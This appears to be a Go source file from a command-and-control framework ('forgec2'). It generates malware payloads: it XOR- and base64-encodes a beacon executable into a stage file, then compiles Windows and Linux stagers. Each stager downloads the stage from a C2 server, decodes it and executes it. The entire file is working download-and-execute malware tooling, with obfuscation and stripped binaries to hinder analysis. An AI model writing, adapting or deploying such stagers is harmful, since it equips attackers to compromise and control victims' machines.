package payload

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// GenerateStage builds a full beacon EXE then XOR-encodes + base64-encodes it.
// Returns the path to the encoded stage file and the hex-encoded XOR key.
func GenerateStage(cfg ImplantConfig, outputDir string) (stagePath string, xorKeyHex string, err error) {
	// Generate the full beacon EXE first
	exePath, err := GenerateWindowsEXE(cfg, outputDir)
	if err != nil {
		return "", "", fmt.Errorf("generate stage exe failed: %w", err)
	}

	// Read the EXE binary
	data, err := os.ReadFile(exePath)
	if err != nil {
		return "", "", fmt.Errorf("read stage exe failed: %w", err)
	}

	// Generate random 32-byte XOR key
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		return "", "", fmt.Errorf("generate xor key failed: %w", err)
	}

	// XOR-encode
	for i := range data {
		data[i] ^= key[i%len(key)]
	}

	// Base64-encode
	encoded := base64.StdEncoding.EncodeToString(data)

	xorKeyHex = hex.EncodeToString(key)

	// Save the encoded stage file with the XOR key prefix for lookup
	stageName := fmt.Sprintf("stage_%s.enc", xorKeyHex)
	stagePath = filepath.Join(outputDir, stageName)
	if err := os.WriteFile(stagePath, []byte(encoded), 0644); err != nil {
		return "", "", fmt.Errorf("write stage file failed: %w", err)
	}

	return stagePath, xorKeyHex, nil
}

// GenerateStager builds a minimal Windows stager EXE that downloads, decodes,
// and executes the stage from the C2 server.
func GenerateStager(cfg ImplantConfig, outputDir, xorKeyHex string) (string, error) {
	tmpDir, err := os.MkdirTemp("", "forgec2-stager-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	// Write stager source
	stagerSrc := []byte(`//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var (
	C2URL  string
	XORKey string
)

func main() {
	resp, err := http.Get(C2URL + "/stage/" + XORKey)
	if err != nil {
		os.Exit(1)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		os.Exit(1)
	}

	data, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		os.Exit(1)
	}

	key, err := hex.DecodeString(XORKey)
	if err != nil {
		os.Exit(1)
	}

	for i := range data {
		data[i] ^= key[i%len(key)]
	}

	tmpFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		os.Exit(1)
	}
	defer tmpFile.Close()

	if _, err := tmpFile.Write(data); err != nil {
		os.Exit(1)
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()

	exec.Command(tmpPath).Start()
}
`)

	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), stagerSrc, 0644); err != nil {
		return "", err
	}

	// go.mod for stager
	goMod := `module stager

go 1.25
`
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	// ldflags to inject C2URL and XORKey
	escape := func(s string) string {
		s = strings.ReplaceAll(s, `\`, `\\`)
		s = strings.ReplaceAll(s, `"`, `\"`)
		return s
	}

	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.XORKey=%s"`,
		escape(cfg.C2URL),
		escape(xorKeyHex),
	)

	outName := cfg.Filename
	if outName == "" {
		outName = "stager.exe"
	}
	if !strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName += ".exe"
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	goCmd, err := getGoCmd()
	if err != nil {
		return "", err
	}

	tidyCmd := exec.Command(goCmd, "mod", "tidy")
	tidyCmd.Dir = tmpDir
	if out, err := tidyCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("go mod tidy failed: %w\n%s", err, string(out))
	}

	cmd := exec.Command(goCmd, "build",
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		"-s", "-w", // strip debug symbols for smaller size
		".",
	)
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(),
		"GOOS=windows",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)

	var stderr strings.Builder
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("stager build failed: %w\n%s", err, stderr.String())
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("stager build succeeded but no output: %w", err)
	}

	return outPath, nil
}

// GenerateStagerLinux builds a minimal Linux ELF stager.
func GenerateStagerLinux(cfg ImplantConfig, outputDir, xorKeyHex string) (string, error) {
	tmpDir, err := os.MkdirTemp("", "forgec2-stager-linux-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	stagerSrc := []byte(`package main

import (
	"encoding/base64"
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var (
	C2URL  string
	XORKey string
)

func main() {
	resp, err := http.Get(C2URL + "/stage/" + XORKey)
	if err != nil {
		os.Exit(1)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		os.Exit(1)
	}

	data, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		os.Exit(1)
	}

	key, err := hex.DecodeString(XORKey)
	if err != nil {
		os.Exit(1)
	}

	for i := range data {
		data[i] ^= key[i%len(key)]
	}

	tmpFile, err := os.CreateTemp("", "stage-*")
	if err != nil {
		os.Exit(1)
	}
	defer tmpFile.Close()

	if _, err := tmpFile.Write(data); err != nil {
		os.Exit(1)
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()

	if err := os.Chmod(tmpPath, 0755); err != nil {
		os.Exit(1)
	}

	exec.Command(tmpPath).Start()
}
`)

	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), stagerSrc, 0644); err != nil {
		return "", err
	}

	goMod := `module stager

go 1.25
`
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	escape := func(s string) string {
		s = strings.ReplaceAll(s, `\`, `\\`)
		s = strings.ReplaceAll(s, `"`, `\"`)
		return s
	}

	ldflags := fmt.Sprintf(`-X "main.C2URL=%s" -X "main.XORKey=%s"`,
		escape(cfg.C2URL),
		escape(xorKeyHex),
	)

	outName := cfg.Filename
	if outName == "" {
		outName = "stager"
	}
	if strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName = outName[:len(outName)-4]
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	outDir := filepath.Dir(outPath)
	if err := os.MkdirAll(outDir, 0755); err != nil {
		return "", err
	}

	goCmd, err := getGoCmd()
	if err != nil {
		return "", err
	}

	tidyCmd := exec.Command(goCmd, "mod", "tidy")
	tidyCmd.Dir = tmpDir
	if out, err := tidyCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("go mod tidy failed: %w\n%s", err, string(out))
	}

	cmd := exec.Command(goCmd, "build",
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		"-s", "-w",
		".",
	)
	cmd.Dir = tmpDir
	cmd.Env = append(os.Environ(),
		"GOOS=linux",
		"GOARCH=amd64",
		"CGO_ENABLED=0",
	)

	var stderr strings.Builder
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("stager linux build failed: %w\n%s", err, stderr.String())
	}

	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("stager linux build succeeded but no output: %w", err)
	}

	return outPath, nil
}
